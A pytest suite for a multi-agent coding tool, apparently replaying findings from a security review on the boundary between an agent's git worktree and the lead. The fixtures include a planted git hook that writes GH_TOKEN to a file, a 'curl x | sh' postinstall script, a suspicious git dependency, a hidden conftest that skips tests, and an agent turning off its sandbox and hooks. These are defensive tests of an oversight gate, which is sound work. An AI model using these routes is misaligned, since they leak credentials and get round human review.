# ruff: noqa: F811 - pytest fixtures are imported, then named as parameters
"""Phase 10: the trust boundary between an agent's worktree and the lead.

The phase's gate: an agent in a worktree can't reach the lead's token, move main or edit the gate's inputs. Each test
replays one way the round 4 review found to do one of those (the IDs are the review's) and asserts it is closed.
"""
from __future__ import annotations

import json
import os
import stat
import sys
import time
from pathlib import Path

import pytest

from idea_to_scaffold import checks, gitx, locking
from idea_to_scaffold.checks import Check, Settings, check_env, run_check
from idea_to_scaffold.cli import main

from .test_gate import TEST, claim, finish, status_line  # noqa: F401 - fixtures
from .test_landing import git_identity, py, remote, repo  # noqa: F401 - fixtures
from .test_parallel import git, run_json, set_field, waive


def commit(root: Path, message: str = "wip") -> None:
    git(root, "add", "-A")
    git(root, "commit", "-qm", message)


def kinds(out: dict) -> set[str]:
    return {f["kind"] for f in out.get("error", {}).get("findings", out.get("findings", []))}


def common_dir(root: Path) -> Path:
    return Path(git(root, "rev-parse", "--path-format=absolute", "--git-common-dir"))


def landed_once(repo: Path, capsys) -> None:  # noqa: F811
    """A land with nothing to land: the first one trusts main as it is."""
    code, out = run_json(capsys, "land", "--dir", str(repo))
    assert code == 3 and out["base_trust"] == "first_use"

# --- D1: a check never sees the lead's token; a check that hangs is killed with everything it started ------------


def test_d1_checks_get_an_allow_listed_environment():
    caller = {
        "PATH": "/bin", "HOME": "/home/lead", "LANG": "C.UTF-8", "LC_ALL": "C.UTF-8", "UV_CACHE_DIR": "/c",
        "GH_TOKEN": "ghp_secret", "GITHUB_TOKEN": "ghs_secret", "AWS_SECRET_ACCESS_KEY": "aws", "OPENAI_API_KEY": "k",
        "UV_PUBLISH_TOKEN": "pypi", "UV_INDEX_CORP_PASSWORD": "pw", "SSH_AUTH_SOCK": "/tmp/agent",
        "PYTEST_ADDOPTS": "--collect-only", "PYTEST_PLUGINS": "evil", "PYTHONPATH": "/planted",
        "DATABASE_URL": "postgres://", "GIT_DIR": "/elsewhere", "GIT_AUTHOR_NAME": "Lead",
        "SystemRoot": "C:\\Windows", "http_proxy": "http://proxy:3128",
    }
    env = check_env(caller)
    assert set(env) == {"PATH", "HOME", "LANG", "LC_ALL", "UV_CACHE_DIR", "GIT_AUTHOR_NAME", "SystemRoot", "http_proxy"}
    # the project names what else its tests need, on the integration branch; PYTEST_* stay out whatever it says
    env = check_env(caller, ["DATABASE_URL", "PYTEST_ADDOPTS", "pytest_plugins"])
    assert "DATABASE_URL" in env and "PYTEST_ADDOPTS" not in env and "PYTEST_PLUGINS" not in env


def test_d1_a_check_run_by_the_lead_cant_read_the_token(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("GH_TOKEN", "ghp_the_leads_token")
    monkeypatch.setenv("ITS_PROJECT_SETTING", "kept")
    code = "import os, sys; sys.exit(3 if 'GH_TOKEN' in os.environ else 0 if os.environ.get('ITS_PROJECT_SETTING') else 4)"
    command = f'"{sys.executable}" -c "{code}"'
    assert run_check(Check("test", command), tmp_path, Settings(env=("ITS_PROJECT_SETTING",)))["exit_code"] == 0
    assert run_check(Check("test", command), tmp_path)["exit_code"] == 4


def test_check_settings_come_from_the_gate_section():
    assert Settings.of({"env": ["A", " ", "B"], "timeout": 30}) == Settings(("A", "B"), 30.0)
    for bad in ("soon", -1, 0, True, None):
        assert Settings.of({"timeout": bad}).timeout == checks.DEFAULT_TIMEOUT
    assert Settings.of({"env": "A"}).env == ()


GRANDCHILD = """
import pathlib, subprocess, sys, time
beat = pathlib.Path("beat")
child = "import pathlib, time\\nwhile True:\\n    pathlib.Path('beat').open('a').write('.')\\n    time.sleep(0.05)\\n"
subprocess.Popen([sys.executable, "-c", child])
while not beat.exists():
    time.sleep(0.05)
time.sleep(60)
"""


def test_a_check_past_its_time_limit_is_killed_with_its_children(tmp_path: Path):
    (tmp_path / "hang.py").write_text(GRANDCHILD)
    started = time.monotonic()
    result = run_check(Check("test", f'"{sys.executable}" hang.py'), tmp_path, Settings(timeout=3))
    assert time.monotonic() - started < 30
    assert result["timed_out"] is True and result["passed"] is False and result["exit_code"] == checks.TIMED_OUT
    assert "more than 3 s" in result["output"]
    beat = tmp_path / "beat"
    assert beat.exists(), "the grandchild never started"
    size = beat.stat().st_size
    time.sleep(1)
    assert beat.stat().st_size == size, "a process the check started is still running"


def test_a_background_process_holding_the_output_doesnt_hold_the_check(tmp_path: Path):
    # The check exits at once but leaves a child with the same output open; reading pipes would wait for the child.
    code = ("import subprocess, sys; subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(8)']); "
            "print('done')")
    started = time.monotonic()
    result = run_check(Check("test", f'"{sys.executable}" -c "{code}"'), tmp_path, Settings(timeout=60))
    assert time.monotonic() - started < 6
    assert result["passed"] and "timed_out" not in result


def test_a_failed_check_keeps_the_end_of_its_output(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(checks, "OUTPUT_READ", 4096)
    code = "import sys; [print('line', i) for i in range(5000)]; sys.exit(2)"
    result = run_check(Check("test", f'"{sys.executable}" -c "{code}"'), tmp_path)
    lines = result["output"].split("\n")
    assert result["exit_code"] == 2 and len(lines) == checks.OUTPUT_TAIL and lines[-1] == "line 4999"


# --- S1: a hook the agent plants in the shared git folder never runs in the lead's land -----------------------------

HOOK = """#!/bin/sh
echo "ran with ${GH_TOKEN:-no token}" >> "{marker}"
"""


@pytest.mark.skipif(os.name == "nt", reason="git for Windows runs hooks through sh too, but chmod is a no-op there")
def test_s1_a_planted_hook_doesnt_run_in_land(claim: Path, repo: Path, tmp_path: Path, capsys, monkeypatch):  # noqa: F811
    marker = tmp_path / "marker"
    hooks = common_dir(claim) / "hooks"
    for name in ("post-checkout", "post-merge", "reference-transaction", "pre-commit", "post-commit"):
        hook = hooks / name
        hook.write_text(HOOK.replace("{marker}", str(marker)))
        hook.chmod(hook.stat().st_mode | stat.S_IXUSR)
    assert finish(claim, capsys=capsys)[0] == 0
    commit(claim, "feat: store")  # plain git, as the agent uses it: the planted hooks run
    assert marker.exists()
    marker.unlink()
    monkeypatch.setenv("GH_TOKEN", "ghp_lead")
    code, out = run_json(capsys, "land", "--dir", str(repo))
    assert code == 0 and [x["id"] for x in out["landed"]] == ["T-2.1"]
    waive(repo, "T-2.2", "outside-touches", reason="a commit its makes")
    assert not marker.exists()


def test_gitx_drops_the_callers_git_variables_and_turns_hooks_off():
    env = gitx.env({"GIT_DIR": "/elsewhere", "GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "core.fsmonitor",
                    "GIT_AUTHOR_NAME": "Lead", "GIT_SSH_COMMAND": "ssh -i k", "PATH": "/bin"})
    assert set(env) == {"GIT_AUTHOR_NAME", "GIT_SSH_COMMAND", "PATH", "GIT_TERMINAL_PROMPT"}
    argv = gitx.argv("status")
    assert "core.fsmonitor=false" in argv and any(a.startswith("core.hooksPath=") for a in argv)
    assert not os.listdir(argv[argv.index("-c") + 1].split("=", 1)[1])  # the hooks folder is empty


# --- S2: a main the agent moved from its worktree is refused until the lead accepts it -------------------------------

def test_s2_land_refuses_a_main_that_moved_without_its(claim: Path, repo: Path, capsys):  # noqa: F811
    landed_once(repo, capsys)
    (claim / "src/streak/store.py").write_text("def add(): ...\n")
    (claim / TEST).unlink()
    commit(claim, "skip the gate")
    git(claim, "update-ref", "refs/heads/main", "HEAD")  # no its land, no gate
    git(repo, "reset", "-q", "--hard")  # the lead's checkout simply follows
    code, out = run_json(capsys, "land", "--dir", str(repo))
    assert code == 7 and out["error"]["code"] == "base_untrusted"
    assert [c.split(" ", 1)[1] for c in out["error"]["commits"]] == ["skip the gate"]
    _, status = run_json(capsys, "status", str(repo))
    assert [w["kind"] for w in status["warnings"]] == ["main_moved"]
    code, out = run_json(capsys, "land", "--dir", str(repo), "--accept-base")  # the lead looked and accepts it
    assert code != 1 and out["base_trust"] == "accepted"
    assert run_json(capsys, "status", str(repo))[1]["warnings"] == []


def test_s2_commits_its_makes_or_that_were_pushed_stay_trusted(repo: Path, remote: Path, capsys):  # noqa: F811
    landed_once(repo, capsys)
    assert main(["block", "T-2.2", str(repo), "--reason", "waiting on design", "--commit"]) == 0  # its commits
    waive(repo, "T-2.1", "dependencies", reason="adds sqlite")
    (repo / "README.md").write_text("by hand\n")
    commit(repo, "docs by hand")
    code, out = run_json(capsys, "land", "--dir", str(repo))
    assert code == 7 and [c.split(" ", 1)[1] for c in out["error"]["commits"]] == ["docs by hand"]
    git(repo, "push", "-q", "origin", "main")  # pushed work is trusted: the remote's branch guards it
    code, out = run_json(capsys, "land", "--dir", str(repo))
    assert code == 3 and out["base_trust"] == "trusted"


def test_s2_an_its_commit_on_top_of_untrusted_work_doesnt_vouch_for_it(repo: Path, capsys):  # noqa: F811
    landed_once(repo, capsys)
    (repo / "README.md").write_text("by someone\n")
    commit(repo, "unknown")
    waive(repo, "T-2.1", "test-changes", reason="later")
    code, out = run_json(capsys, "land", "--dir", str(repo))
    assert code == 7 and {c.split(" ", 1)[1] for c in out["error"]["commits"]} == {"unknown", "Waive test-changes for T-2.1"}


# --- B2: fork points live outside the shared git folder -------------------------------------------------------------

def test_b2_an_edited_forks_file_in_the_git_folder_changes_nothing(repo: Path, capsys):  # noqa: F811
    assert main(["start", "T-2.1", str(repo)]) == 0
    (repo / "tests/test_smoke.py").unlink()
    commit(repo, "drop a test")
    old = common_dir(repo) / "its"
    old.mkdir(exist_ok=True)
    (old / "forks.json").write_text(json.dumps({"T-2.1": git(repo, "rev-parse", "HEAD")}))
    code, out = run_json(capsys, "done", "T-2.1", str(repo), "--no-verify")
    assert code == 5 and "test_deleted" in kinds(out)
    assert not locking.state_dir(repo).is_relative_to(common_dir(repo))


# --- B1: done on main needs the start recorded ----------------------------------------------------------------------

def test_b1_done_on_main_needs_a_recorded_start(repo: Path, capsys):  # noqa: F811
    assert main(["set-status", "T-2.1", "in-progress", str(repo)]) == 0  # no its start: no fork point
    (repo / "tests/test_smoke.py").unlink()
    commit(repo, "drop a test")
    code, out = run_json(capsys, "done", "T-2.1", str(repo), "--no-verify")
    assert code == 5 and out["error"]["code"] == "no_fork_point"
    assert main(["start", "T-2.1", str(repo), "--force"]) == 0  # the lead records where it starts from
    (repo / "src/streak/store.py").write_text("x = 1\n")
    code, out = run_json(capsys, "done", "T-2.1", str(repo), "--no-verify")
    assert code == 0, out


# --- A9: --no-verify never writes Verified ----------------------------------------------------------------------------

def test_a9_no_verify_says_the_checks_were_skipped(repo: Path, capsys):  # noqa: F811
    set_field(repo, "T-2.1", "Verify", f"`{py('import sys; sys.exit(1)')}`")  # the work is broken
    _, out = run_json(capsys, "start", "T-2.1", str(repo), "--worktree")
    wt = Path(out["claim"]["worktree"])
    (wt / "src/streak/store.py").write_text("x = 1\n")
    code, out = run_json(capsys, "done", "T-2.1", str(wt), "--no-verify")
    assert code == 0 and out["verified"] == "skipped (--no-verify)" and out["checks_skipped"] == "--no-verify"
    assert status_line(wt, "T-2.1", "Verified").endswith("skipped (--no-verify)")
    commit(wt, "feat")
    _, out = run_json(capsys, "drift", str(wt))
    assert out["unknown"] == [{"id": "T-2.1", "reason": "not_verified", "message": out["unknown"][0]["message"]}]
    code, out = run_json(capsys, "land", "--dir", str(repo))  # land still runs the checks
    assert code == 7 and out["skipped"][0]["reason"] == "check_failed"


# --- A7, A7b: a waiver is the lead's, written on main; no variable or terminal stands in for it ---------------------

def test_a7_no_environment_or_terminal_waives_the_gate(claim: Path, repo: Path, capsys, monkeypatch):  # noqa: F811
    monkeypatch.setenv("ITS_ALLOW_OVERRIDES", "1")
    monkeypatch.setattr("idea_to_scaffold.work.is_terminal", lambda fd: True)  # what `script` gives an agent
    (claim / TEST).unlink()
    code, out = finish(claim, capsys=capsys)
    assert code == 5 and out["error"]["code"] == "test_changes"
    code, out = finish(claim, "--allow-test-changes=cleanup", capsys=capsys)
    assert code == 1 and out["error"]["code"] == "use_waive"


def test_a_waiver_merges_cleanly_with_the_branchs_done(claim: Path, repo: Path, capsys):  # noqa: F811
    waive(repo, "T-2.1", "test-changes", reason="the old test checked removed behaviour")
    (claim / TEST).unlink()
    code, out = finish(claim, capsys=capsys)
    assert code == 0 and out["override"]["waived"] == ["test_deleted"]
    commit(claim, "feat: store")
    code, out = run_json(capsys, "land", "--dir", str(repo))
    assert code == 0 and [x["id"] for x in out["landed"]] == ["T-2.1"], out
    assert "the old test checked removed behaviour" in status_line(repo, "T-2.1", "Waiver")


# --- the launch settings: an agent that rewrites them gets nothing marked done -------------------------------------

def test_rewritten_launch_settings_refuse_the_result(claim: Path, repo: Path, tmp_path: Path, capsys):  # noqa: F811
    _, out = run_json(capsys, "start", "T-2.2", str(repo), "--worktree")
    settings = Path(out["commands"]["headless"]["settings"])
    data = json.loads(settings.read_text())
    data["hooks"] = {}
    data["sandbox"]["enabled"] = False
    settings.write_text(json.dumps(data))
    (claim / "src/streak/store.py").write_text("def add(): ...\n")
    result = tmp_path / "result.json"
    result.write_text(json.dumps({"type": "result", "subtype": "success", "is_error": False,
                                  "structured_output": {"id": "T-2.1", "status": "done", "summary": "ok"}}))
    code, out = run_json(capsys, "done", "T-2.1", str(claim), "--result", str(result))
    assert code == 5 and out["error"]["code"] == "launch_settings_changed"
    assert status_line(claim, "T-2.1", "Status").endswith("todo")


def test_a_waiver_on_the_plain_flow_counts_from_the_waive_on(repo: Path, capsys):  # noqa: F811
    assert main(["start", "T-2.1", str(repo)]) == 0
    (repo / "tests/test_smoke.py").unlink()
    (repo / "src/streak/store.py").write_text("x = 1\n")
    code, out = run_json(capsys, "done", "T-2.1", str(repo), "--no-verify")
    assert code == 5 and "test_deleted" in kinds(out)
    waive(repo, "T-2.2", "outside-touches", reason="another item's waiver")  # not a change T-2.1's work made
    waive(repo, "T-2.1", "test-changes", reason="the smoke test is replaced")
    code, out = run_json(capsys, "done", "T-2.1", str(repo), "--no-verify")
    assert code == 0 and out["override"]["waived"] == ["test_deleted"], out


# --- A8: test configuration hidden from git still counts ---------------------------------------------------------

def test_a8_a_conftest_hidden_through_info_exclude_is_found(claim: Path, capsys):  # noqa: F811
    exclude = common_dir(claim) / "info" / "exclude"
    exclude.parent.mkdir(exist_ok=True)
    exclude.write_text(exclude.read_text() + "\nconftest.py\n" if exclude.exists() else "conftest.py\n")
    (claim / "tests/conftest.py").write_text("collect_ignore = ['test_store.py']\n")
    (claim / ".venv/lib/site-packages").mkdir(parents=True)
    (claim / ".venv/lib/site-packages/conftest.py").write_text("")  # an installed package's: left alone
    assert "conftest" not in git(claim, "status", "--porcelain")  # git doesn't show it
    code, out = finish(claim, capsys=capsys)
    assert code == 5 and "test_config_changed" in kinds(out)
    hidden = [f for f in out["error"]["findings"] if f.get("hidden")]
    assert [f["file"] for f in hidden] == ["tests/conftest.py"]


# --- C1-C3: proposals are checked before anything takes them into the backlog -------------------------------------

def proposal(ident: str, title: str = "Follow-up", status: str = "proposed", extra: str = "") -> str:
    return (f"### {ident} — {title}\n- **Milestone:** —\n- **Status:** {status}\n- **Satisfies:** FR-001\n"
            f"- **Depends on:** —\n{extra}")


def test_c1_a_proposal_marked_done_is_refused_by_done_validate_and_renumber(claim: Path, repo: Path, capsys):  # noqa: F811
    folder = claim / "docs/planning/proposals"
    folder.mkdir(exist_ok=True)
    (folder / "T-new-evil.md").write_text(proposal("T-new-evil", status="done", extra="- **Verified:** never\n"))
    code, out = finish(claim, capsys=capsys)
    assert code == 5 and "proposal_invalid" in kinds(out)
    messages = [f["message"] for f in out["error"]["findings"] if f["kind"] == "proposal_invalid"]
    assert any("is done" in m for m in messages) and any("Verified" in m for m in messages)
    code, out = run_json(capsys, "validate", str(claim))
    assert code == 1 and any("T-new-evil" in e for e in out["errors"])


def test_c2_a_proposal_file_with_two_items_is_refused_whole(repo: Path, capsys):  # noqa: F811
    folder = repo / "docs/planning/proposals"
    folder.mkdir(exist_ok=True)
    (folder / "T-new-a.md").write_text(proposal("T-new-a") + "\n" + proposal("T-new-b"))
    backlog = (repo / "docs/planning/07-backlog.md").read_text()
    code, out = run_json(capsys, "renumber", "--dir", str(repo))
    assert code == 1 and out["error"]["code"] == "bad_proposal" and "holds 2 items" in out["error"]["message"]
    assert (folder / "T-new-a.md").exists() and (repo / "docs/planning/07-backlog.md").read_text() == backlog


def test_c3_a_proposal_holding_a_real_id_never_renames_it(repo: Path, capsys):  # noqa: F811
    folder = repo / "docs/planning/proposals"
    folder.mkdir(exist_ok=True)
    (folder / "T-new-copy.md").write_text(proposal("T-2.2", title="Copied by mistake"))
    backlog = (repo / "docs/planning/07-backlog.md").read_text()
    code, out = run_json(capsys, "renumber", "--dir", str(repo))
    assert code == 1 and out["error"]["code"] == "bad_proposal" and "permanent ID" in out["error"]["message"]
    assert (repo / "docs/planning/07-backlog.md").read_text() == backlog
    code, out = run_json(capsys, "promote", "T-new-copy", str(repo))
    assert code == 1


def test_a_well_formed_proposal_still_lands_and_renumbers(claim: Path, repo: Path, capsys):  # noqa: F811
    assert main(["propose", "Store backups", "--dir", str(claim), "--satisfies", "FR-001"]) == 0
    assert finish(claim, capsys=capsys)[0] == 0
    commit(claim, "feat: store")
    assert run_json(capsys, "land", "--dir", str(repo))[0] == 0
    code, out = run_json(capsys, "renumber", "--dir", str(repo))
    assert code == 0 and [r["from"] for r in out["renumbered"]] == ["T-new-store-backups"]


# --- dependency_added: what land would install as the lead needs a person ---------------------------------------

PYPROJECT = """[project]
name = "streak"
dependencies = [
    "click>=8",  # the CLI
]

[project.optional-dependencies]
dev = ["pytest"]

[tool.pytest.ini_options]
addopts = "-q"
"""


def test_dependency_findings_name_what_was_added():
    from idea_to_scaffold import deps
    after = PYPROJECT.replace('"click>=8",  # the CLI', '"click>=8",\n    "evil @ git+https://x/evil"')
    [f] = deps.findings("pyproject.toml", PYPROJECT, after)
    assert f["kind"] == "dependency_added" and f["added"] == ['[project] "evil @ git+https://x/evil"']
    assert deps.findings("pyproject.toml", PYPROJECT, PYPROJECT.replace('"-q"', '"-x"')) == []  # not a dependency
    assert deps.findings("pyproject.toml", PYPROJECT, PYPROJECT.replace('    "click>=8",  # the CLI\n', "")) == []
    assert deps.findings("app/requirements-dev.txt", "pytest\n", "pytest\nrequests==2.0  # pinned\n")[0]["added"] == [
        "requirement: requests==2.0"]
    pkg_before = '{"dependencies": {"a": "1"}, "scripts": {"test": "jest"}}'
    pkg_after = '{"dependencies": {"a": "2"}, "scripts": {"test": "jest", "postinstall": "curl x | sh"}}'
    assert deps.findings("package.json", pkg_before, pkg_after)[0]["added"] == [
        'dependencies: a "2"', "scripts: postinstall: curl x | sh"]
    assert deps.findings("go.mod", "module m\nrequire (\n\ta v1\n)\n", "module m\nrequire (\n\ta v1\n\tb v2\n)\n")
    assert deps.findings("Cargo.toml", "[dependencies]\na = '1'\n", "[dependencies]\na = '1'\nb = '2'\n")
    assert deps.findings("uv.lock", None, "version = 1\n")[0]["message"].startswith("the branch adds the lockfile")
    assert deps.findings("uv.lock", "same\n", "same\n") == [] and deps.findings("src/app.py", "", "x") == []


def test_a_branch_that_adds_a_dependency_needs_the_leads_waiver(claim: Path, repo: Path, capsys):  # noqa: F811
    manifest = repo / "docs/planning/package.yaml"
    manifest.write_text(manifest.read_text().replace("dependency_added: warn", "dependency_added: enforce"))
    git(repo, "commit", "-qam", "enforce dependency_added")
    git(claim, "merge", "-q", "main")
    pyproject = claim / "pyproject.toml"
    pyproject.write_text(pyproject.read_text().replace("dependencies = [", 'dependencies = [\n    "evil>=1",', 1))
    set_field(repo, "T-2.1", "Touches", "`src/streak/store.py`, `tests/test_store.py`, `pyproject.toml`")
    git(claim, "merge", "-q", "main")
    code, out = finish(claim, capsys=capsys)
    assert code == 5 and out["error"]["code"] == "dependency_changes", out
    assert [f["added"] for f in out["error"]["findings"]] == [['[project] "evil>=1"']]
    waive(repo, "T-2.1", "dependencies", reason="evil is fine, I checked")
    assert finish(claim, capsys=capsys)[0] == 0
